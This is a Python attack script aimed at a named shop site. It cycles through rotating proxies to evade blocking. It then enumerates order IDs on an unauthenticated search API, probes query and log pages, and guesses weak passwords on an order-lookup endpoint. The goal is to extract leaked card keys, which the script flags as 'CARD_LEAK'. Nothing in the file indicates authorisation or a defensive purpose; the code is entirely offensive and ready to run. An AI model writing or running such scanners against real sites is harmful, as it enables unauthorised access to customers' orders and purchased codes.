#!/usr/bin/env python3
"""Find working qg proxy for xinhe001 via curl, then quick multi-vector probe."""
import json
import re
import subprocess
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

OUT = sys.argv[1] if len(sys.argv) > 1 else "/tmp/xinhe001_curl_scan.json"
ROUNDS = int(sys.argv[2]) if len(sys.argv) > 2 else 40

SHOW = re.compile(r"showOrder")
BASE = "https://xinhe001.lol/shop/"


def fetch_proxy():
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True, timeout=35)
    env = {}
    for line in open("/data/config/proxy.env"):
        if "=" in line and not line.startswith("#"):
            k, v = line.strip().split("=", 1)
            env[k] = v.strip('"').strip("'")
    return env.get("PROXY_URL", ""), env.get("PROXY_AREA", "")


def curl_home(px):
    cmd = [
        "curl", "-sS", "-k", "--max-time", "28", "-x", px,
        "-A", "Mozilla/5.0", BASE,
    ]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return r.stdout or ""


def main():
    report = {"rounds": [], "hits": [], "ts": time.strftime("%Y-%m-%d %H:%M:%S")}
    for i in range(ROUNDS):
        px, area = fetch_proxy()
        if not px:
            continue
        body = curl_home(px)
        ok = len(body) > 5000
        row = {"round": i + 1, "area": area, "len": len(body), "ok": ok}
        report["rounds"].append(row)
        print(f"round {i+1} {area} len={len(body)} ok={ok}", flush=True)
        if not ok:
            continue
        proxies = {"http": px, "https": px}
        s = requests.Session()
        s.verify = False
        s.proxies = proxies
        s.headers.update({"User-Agent": "Mozilla/5.0", "Referer": BASE})
        gc = s.get(BASE + "ajax.php?act=getcount", timeout=22)
        row["getcount"] = gc.text[:200]
        print("  getcount", gc.text[:100], flush=True)
        try:
            orders = int(json.loads(gc.text).get("orders", 5718))
        except Exception:
            orders = 5718
        for oid in range(orders, orders - 20, -1):
            ar = s.get(BASE + f"api.php?act=search&id={oid}", timeout=16)
            if '"code":0' in ar.text and (
                "km" in ar.text.lower() or "----" in ar.text or SHOW.search(ar.text)
            ):
                hit = {"api": oid, "body": ar.text[:400]}
                report["hits"].append(hit)
                print("  API HIT", oid, ar.text[:80], flush=True)
            time.sleep(1.5)
        for q in ["1", "138", "888", "123456"]:
            qr = s.get(BASE, params={"mod": "query", "data": q}, timeout=16)
            if SHOW.search(qr.text):
                hit = {"query": q, "shows": len(SHOW.findall(qr.text))}
                report["hits"].append(hit)
                print("  QUERY HIT", q, flush=True)
            time.sleep(1.0)
        tl = s.get(BASE + "toollogs.php", timeout=16)
        if SHOW.search(tl.text):
            report["hits"].append({"toollogs": True, "n": len(SHOW.findall(tl.text))})
            print("  TOOLLOGS HIT", flush=True)
        for pwd in ["123456", "888888", "xinhe001"]:
            pr = s.post(
                BASE + "ajax.php?act=query",
                data={"type": "1", "content": "1", "pwd": pwd},
                timeout=16,
            )
            if SHOW.search(pr.text) or "kminfo" in pr.text:
                report["hits"].append({"pwd": pwd, "body": pr.text[:200]})
                print("  PWD HIT", pwd, flush=True)
            time.sleep(1.0)
        row["hits"] = len(report["hits"])
        report["WIN"] = row
        break
    report["CARD_LEAK"] = len(report["hits"]) > 0
    with open(OUT, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print("DONE hits=", len(report["hits"]), "CARD_LEAK=", report["CARD_LEAK"], flush=True)


if __name__ == "__main__":
    main()
